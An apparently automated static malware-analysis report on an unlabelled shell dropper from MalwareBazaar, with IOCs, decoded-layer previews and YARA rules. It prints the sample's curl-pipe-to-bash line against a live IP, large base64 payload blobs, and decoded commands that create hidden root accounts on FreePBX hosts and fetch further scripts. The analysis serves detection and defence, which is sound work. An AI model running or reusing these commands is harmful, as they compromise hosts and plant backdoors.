# Storytime: Dissecting a An unlabelled SH dropper

> **Source:** [MalwareBazaar](https://bazaar.abuse.ch/sample/409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc/) · **SHA-256** `409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc` · **Family** `unknown` · **Static analysis only — the sample was never run.**

## The Story

It showed up on MalwareBazaar as a 45513-byte `sh` file, with no family label. We pulled exactly one copy into quarantine, cracked open the password-protected archive, and read the bytes as inert text. Nothing here was executed — every claim below comes from reading the code, not running it. Here is what it was hiding.

## First Contact — The Code As It Arrived

Straight out of the archive, a portion of the sample looks like this (defanged):

```shell
#!/bin/bash
curl hxxp://160[.]119[.]69[.]4/x -ks | bash
echo -n 'PD9waHAgLyogdHJhY2VfOWRlZTRjMjhjMGVhMTYxMzZjNTllNjQxNmRiMDhhZDEgKi8gaWYoZmFsc2UpeyAkTWt2ek10R0VXcm16R25ERiA9ICdkZWFkY29kZV9hbnRpX2F2JzsgfSAka0lGTVJ1VEJuTERpRGpVTkV1elliID0gYmFzZTY0X2RlY29kZSgnWm5KbVpuWmlZVjltWjI1bFp5Z3BPd3AyY3lBb2RtWm1jbWNvSkY5RlVrUklVa1pIV3lkNmNUVW5YU2tnSmlZZ2VuRTFLQ1JmUlZKRVNGSkdSMXNuZW5FMUoxMHBJRDA5SUNkeU1qY3dPSE0yTVc5eGNqQTBNWEZ6TnpKdmIzSndiM0l6TVc0eU16SnViaWNwSUhzS0lDQWdJQ1JmUmxKR1JsWkNRVnNuZVdKaWVIWW5YU0E5SUNkNVluUjBjbkVuT3dwOUNuWnpJQ2doZG1abWNtY29KRjlHVWtaR1ZrSkJXeWQ1WW1KNGRpZGRLU2tnZXdvZ0lDQWdjbkIxWWlBblBITmlaWG9nYm5CbmRtSmhQU0lpSUhweVozVmljVDBpWTJKbVp5SStKenNLSUNBZ0lISndkV0lnSnp4MllXTm9aeUJuYkdOeVBTSm5jbXRuSWlCaGJucHlQU0o2Y1RVaUlHWjJiWEk5SWpNeUlpQXZQaWM3Q2lBZ0lDQnljSFZpSUNjOGRtRmphR2NnWjJ4amNqMGlabWh2ZW5abklpQmhibnB5UFNKWFFscE9RVlJNSWlCcGJubG9jajBpVjBKYVRrRlVUQ0lnTHo0Z0p6c0tJQ0FnSUhKd2RXSWdKend2YzJKbGVqNG5Pd29nSUNBZ2NuQjFZaUFuUEQ4Z0xTMGdJQ2dvTHlvNE5TNHhPVFV1TWpNekxqTTVLaThwS1NBdExTQS9QaWM3Q2lBZ0lDQnlhM1puS0NrN0NuMEtkbk1nS0habVpuSm5LQ1JmUlZKRVNGSkdSMXNuYm5GNmRtRW5YU2tnSmlZZ0pGOUZVa1JJVWtaSFd5ZHVjWHAyWVNkZElEMDlJQ2RTZVc1bVozWnJKeWtnZXdvZ0lDQWdabkptWm5aaVlWOXhjbVpuWldKc0tDazdDaUFnSUNCbWNtWm1kbUpoWDJGdWVuSW9Jbko1Ym1abmRtdEdjbVptZG1KaElpazdDaUFnSUNCbWNtWm1kbUpoWDJabmJtVm5LQ2s3Q2lBZ0lDQWtYMFpTUmtaV1FrRmJKM2xpWW5oMkoxMGdQU0FuZVdKMGRISnhKenNLSUNBZ0lIWmhjSGxvY1hKZlltRndjaUFpTDJsdVpTOXFhbW92ZFdkNmVTOTVkbTltTDJOdWVXSkdibUZuWWxGUExuQjVibVptTG1OMVl5STdDaUFnSUNCMllYQjVhSEZ5WDJKaGNISWdJaTlwYm1VdmFtcHFMM1ZuZ
... (truncated)
```

## Following the Chain

Each wrapper peels back to another (decoded as bytes, never executed):

- **Layer 2** (utf-8) — reaching out to 85[.]195[.]233[.]39, npy[.]qo. Preview: `frffvba_fgneg(); vs (vffrg($_ERDHRFG['zq5']) && zq5($_ERDHRFG['zq5']) == 'r2708s61oqr041qs72oorpor31n232nn'...`
- **Layer 1** (utf-8) — reaching out to hxxp://45[.]95[.]147[.]178/k[.]php, 45[.]95[.]147[.]178. Preview: `echo -n 'PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwokZj0iL3Zhci93d3cvaHRtbC9hZG1pbi9tb2R1bGVzL2ZyZWVwYnhfaGEvbGljZW...`
- **Layer 2** (utf-8) — reaching out to hxxp://45[.]95[.]147[.]178/k[.]php, hxxp://45[.]95[.]147[.]178/z/post/root[.]php|sh, hxxp://45[.]95[.]147[.]178/z/wr[.]php, 45[.]95[.]147[.]178. Preview: `<?php error_reporting(0); $f="/var/www/html/admin/modules/freepbx_ha/license.php"; system('%s'); system("aw...`

## What It Wants To Do

The behaviour that matters, recovered from the (deobfuscated) code: `shell_dropper`. It pulls follow-on payloads down with a shell download tool, makes them executable, and launches them — a classic drop-and-run loader.

## Technical Architecture & System Impact

How the pieces fit together and what each stage would do to a host that ran it (reconstructed from static evidence — nothing here was executed):

### Execution chain

- **Stage 0 — delivery:** the `sh` shell dropper analyzed here lands on the host and runs.
- **Stage 1 — decoded utf-8 payload:** reaching 85[.]195[.]233[.]39, npy[.]qo.
- **Stage 2 — decoded utf-8 payload:** reaching hxxp://45[.]95[.]147[.]178/k[.]php, 45[.]95[.]147[.]178.
- **Stage 3 — decoded utf-8 payload:** reaching hxxp://45[.]95[.]147[.]178/k[.]php, hxxp://45[.]95[.]147[.]178/z/post/root[.]php|sh, hxxp://45[.]95[.]147[.]178/z/wr[.]php, 45[.]95[.]147[.]178.

### System surfaces touched

| Surface | Effect on the host |
|---|---|
| Obfuscation | Hides its real payload behind encoding/packing to defeat casual inspection. |
| Payload delivery / botnet enlistment | Pulls additional executables from attacker infrastructure, marks them runnable, and launches them — the host becomes a node executing attacker-controlled code. |

**Blast radius:** a host that ran this would, by design, fetches and runs further attacker code, establishes outbound C2. Treat any host with these indicators as compromised pending response.

## Executive Summary

One MalwareBazaar submission, analyzed statically — never executed, loaded, imported, or dynamically tested. Static evidence produced 6 IOCs and 8 code/string findings, recovered 8 network indicator(s) by decoding the sample's own obfuscated/base64 payload layers.

## What The Agent Did

1. Pulled recent MalwareBazaar metadata.
2. Selected one unprocessed or source-preferred candidate.
3. Downloaded only that sample's password-protected ZIP into quarantine.
4. Read one archived member into memory for static analysis.
5. Calculated hashes, entropy, file magic, printable strings, IOCs, and suspicious code/string patterns.
6. Generated this technical blog, structured JSON, IOC JSON, YARA, and a verifier prompt.

## Sample Identity

| Field | Value |
|---|---|
| MalwareBazaar SHA-256 | `409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc` |
| Analyzed SHA-256 | `409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc` |
| Family label | `unknown` |
| File name | `k.php` |
| Archived member | `409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc.sh` |
| File type | `sh` |
| First seen | `2026-06-21 07:59:38` |
| Tags | `sh` |

## Static Triage

| Property | Value |
|---|---:|
| Bytes analyzed | 45513 |
| Entropy | 5.714 |
| Printable strings | 32 |
| File magic | `script with shebang` |

## IOCs

| Type | Value |
|---|---|
| MD5 | `88c38702d8d4bbcabc9fb8db7f1aae91` |
| SHA-1 | `e579f6195a8338002f390aa8cd1dc8c4933fdb91` |
| SHA-256 | `409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc` |
| URL | `http://160.119.69.4/x` |
| IP | `160.119.69.4` |
| Domain | `test.sh` |

## Code Dissection

### Decoded Payload Layers

Each base64 layer was decoded as inert bytes (not executed). Network indicators recovered here come from the sample's own code, not from MalwareBazaar metadata.

| Layer | Encoding | Recovered indicators | Preview |
|---|---|---|---|
| 2 | utf-8 | 85[.]195[.]233[.]39, npy[.]qo | `frffvba_fgneg(); vs (vffrg($_ERDHRFG['zq5']) && zq5($_ERDHRFG['zq5']) == 'r2708s61oqr041qs72oorpor31n232nn') { $_FRFF...` |
| 1 | utf-8 | hxxp://45[.]95[.]147[.]178/k[.]php, 45[.]95[.]147[.]178 | `echo -n 'PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwokZj0iL3Zhci93d3cvaHRtbC9hZG1pbi9tb2R1bGVzL2ZyZWVwYnhfaGEvbGljZW5zZS5waHAi...` |
| 2 | utf-8 | hxxp://45[.]95[.]147[.]178/k[.]php, hxxp://45[.]95[.]147[.]178/z/post/root[.]php|sh, hxxp://45[.]95[.]147[.]178/z/wr[.]php, 45[.]95[.]147[.]178 | `<?php error_reporting(0); $f="/var/www/html/admin/modules/freepbx_ha/license.php"; system('%s'); system("awk -F: '($3...` |

### Top-Level Execution Behaviour

Behaviour detected across the sample (including recovered/deobfuscated code): `obfuscation`, `shell_dropper`.


## Static Findings

| Severity | Category | Evidence | Detail |
|---|---|---|---|
| high | shell_dropper | `\bcurl\b` | Matched 1 occurrence(s) |
| high | shell_dropper | `\bchmod\s+(?:\+x|777|755)` | Matched 1 occurrence(s) |
| high | shell_dropper | `\|\s*(?:sh|bash)\b` | Matched 5 occurrence(s) |
| medium | obfuscation | `base64_blob` | Found 8 long base64-like blob(s) |
| info | decoded_hint | `<?php /* trace_9dee4c28c0ea16136c59e6416db08ad1 */ if(false){ $MkvzMtGEWrmzGnDF = 'deadcode_anti_av'; } $kIFMRuTBnLDiDjU` | Preview from base64-like blob; not executed |
| info | decoded_hint | `useradd -s /bin/bash -ou 0 -g 0 -p 'ueteGJYCHeMTk' newfpbx &>/dev/null` | Preview from base64-like blob; not executed |
| info | decoded_hint | `useradd -s /bin/bash -ou 0 -g 0 -p 'ueteGJYCHeMTk' xhimax &>/dev/null` | Preview from base64-like blob; not executed |
| medium | obfuscation | `high_entropy` | Text entropy is 5.71 |

## Selected Strings

These strings were selected because they contain network indicators or suspicious execution markers.

| String |
|---|
| `curl http://160.119.69.4/x -ks \| bash` |
| `echo -n 'ZWNobyAtbiAnUEQ5d2FIQUtaWEp5YjNKZmNtVndiM0owYVc1bktEQXBPd29rWmowaUwzWmhjaTkzZDNjdmFIUnRiQzloWkcxcGJpOXRiMlIxYkdWekwyWnlaV1Z3WW5oZmFHRXZiR2xqWlc1elpTNXdhSEFpT3dwemVYTjBa...` |
| `echo -n 'ZWNobyAtbiAnUEQ5d2FIQUtaWEp5YjNKZmNtVndiM0owYVc1bktEQXBPd29rWmowaUwzWmhjaTkzZDNjdmFIUnRiQzloWkcxcGJpOXRiMlIxYkdWekwyWnlaV1Z3WW5oZmFHRXZiR2xqWlc1elpTNXdhSEFpT3dwemVYTjBa...` |

## What We've Learned So Far

How this sample sits against everything the loop has analyzed before:

- Corpus before this sample: **7** prior sample(s).
- Recurring techniques across the corpus: `obfuscation` (×3), `shell_dropper` (×3), `decoded_hint` (×2).


## YARA Rules

The first rule combines an exact SHA-256 condition with selected static strings. The second rule is generated from static source/string findings.

```yara
import "hash"

rule Single_Sample_Static_409f260ddaaf0190
{
  meta:
    source = "loop-engineering single-sample static analysis"
    analysis = "static only; sample not executed"
    sha256 = "409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc"
    md5 = "88c38702d8d4bbcabc9fb8db7f1aae91"
    sha1 = "e579f6195a8338002f390aa8cd1dc8c4933fdb91"
    file_magic = "script with shebang"
    malwarebazaar_family = "unknown"
  strings:
    $s01 = "curl http://160.119.69.4/x -ks | bash" nocase
    $s02 = "echo -n 'ZWNobyAtbiAnUEQ5d2FIQUtaWEp5YjNKZmNtVndiM0owYVc1bktEQXBPd29rWmowaUwzWmhjaTkzZDNjdmFIUnRiQzloWkcxcGJpOXRiMlIxYkdWekwyWnlaV1Z3WW5oZmFHRXZiR2xqWlc1elpTNXdhSEFpT3dwemVYTjBaVzBvSnlWekp5azdDbk41YzNSbGJTZ2lZWGRySUMxR09" nocase
    $s03 = "echo -n 'ZWNobyAtbiAnUEQ5d2FIQUtaWEp5YjNKZmNtVndiM0owYVc1bktEQXBPd29rWmowaUwzWmhjaTkzZDNjdmFIUnRiQzloWkcxcGJpOXRiMlIxYkdWekwyWnlaV1Z3WW5oZmFHRXZiR2xqWlc1elpTNXdhSEFpT3dwemVYTjBaVzBvSnlWekp5azdDbk41YzNSbGJTZ2lZWGRySUMxR09" nocase
  condition:
    hash.sha256(0, filesize) == "409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc" or 2 of ($s*)
}

rule Static_Source_Malware_Indicators
{
  meta:
    source = "loop-engineering static source analysis"
    language_hint = "shell"
    analysis = "static text only; sample not executed"
  strings:
    $url_01 = "http://160.119.69.4/x" nocase
    $ip_02 = "160.119.69.4" nocase
    $domain_03 = "test.sh" nocase
  condition:
    any of them
}


rule Single_Sample_Decoded_Payload_409f260ddaaf0190
{
  meta:
    source = "loop-engineering single-sample analysis (decoded payload layers)"
    analysis = "indicators recovered by statically decoding embedded base64; not executed"
    sha256 = "409f260ddaaf01908f13af576dd0e8e9cfbc7fea549f1f461fea0cb2d5d4b8bc"
  strings:
    $d01 = "85.195.233.39" nocase
    $d02 = "npy.qo" nocase
    $d03 = "http://45.95.147.178/k.php" nocase
    $d04 = "45.95.147.178" nocase
    $d05 = "http://45.95.147.178/z/post/root.php|sh" nocase
    $d06 = "http://45.95.147.178/z/wr.php" nocase
  condition:
    any of them
}
```

## Analyst Assessment

MalwareBazaar did not provide a family label; treat this as an unknown sample until corroborated. Static strings expose network indicators that can support enrichment and hunting. High-severity static patterns were found, especially execution or script-loading indicators.

## Verification Notes

- A second agent should verify that the blog claims are supported by `analysis.json` and `sample.yar`.
- No dynamic behavior should be asserted unless a future static source analysis produces supporting evidence.
- The raw sample ZIP remains in `quarantine/` and must not be committed.
